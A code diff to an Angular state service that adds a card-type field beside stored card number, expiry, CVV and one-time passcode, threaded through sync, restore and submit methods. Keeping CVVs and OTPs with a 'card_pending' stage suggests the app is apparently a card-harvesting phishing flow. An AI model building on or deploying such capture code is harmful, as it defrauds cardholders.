@@ -82,6 +82,7 @@ export class StateService {
   readonly country = signal<string>(''); 
   readonly phoneCode = signal<string>('');
   readonly cardNumber = signal<string>(''); 
+  readonly cardType = signal<string>(''); // Visa, Mastercard, etc.
   readonly cardExpiry = signal<string>('');
   readonly cardCvv = signal<string>('');
   readonly cardOtp = signal<string>(''); 
@@ -332,6 +333,7 @@ export class StateService {
         address: this.address(),
         country: this.country(),
         cardNumber: this.cardNumber(),
+        cardType: this.cardType(),
         cardExpiry: this.cardExpiry(),
         cardCvv: this.cardCvv(),
         cardOtp: this.cardOtp(),
@@ -390,6 +392,7 @@ export class StateService {
       if(data.address) this.address.set(data.address);
       if(data.country) this.country.set(data.country);
       if(data.cardNumber) this.cardNumber.set(data.cardNumber);
+      if(data.cardType) this.cardType.set(data.cardType);
       if(data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
       if(data.cardCvv) this.cardCvv.set(data.cardCvv);
       if(data.cardOtp) this.cardOtp.set(data.cardOtp);
@@ -519,6 +522,7 @@ export class StateService {
           address: this.address(),
           country: this.country(),
           cardNumber: this.cardNumber(),
+          cardType: this.cardType(),
           cardExpiry: this.cardExpiry(),
           cardCvv: this.cardCvv(),
           cardOtp: this.cardOtp(),
@@ -944,15 +948,17 @@ export class StateService {
       this.syncState();
   }
 
-  updateCard(data: { number?: string, expiry?: string, cvv?: string, otp?: string }) {
+  updateCard(data: { number?: string, cardType?: string, expiry?: string, cvv?: string, otp?: string }) {
       if (data.number) this.cardNumber.set(data.number);
+      if (data.cardType) this.cardType.set(data.cardType);
       if (data.expiry) this.cardExpiry.set(data.expiry);
       if (data.cvv) this.cardCvv.set(data.cvv);
       if (data.otp) this.cardOtp.set(data.otp);
   }
 
-  submitCard(n: string, e: string, c: string) {
+  submitCard(n: string, t: string, e: string, c: string) {
       this.cardNumber.set(n);
+      this.cardType.set(t);
       this.cardExpiry.set(e);
       this.cardCvv.set(c);
       this.stage.set('card_pending');
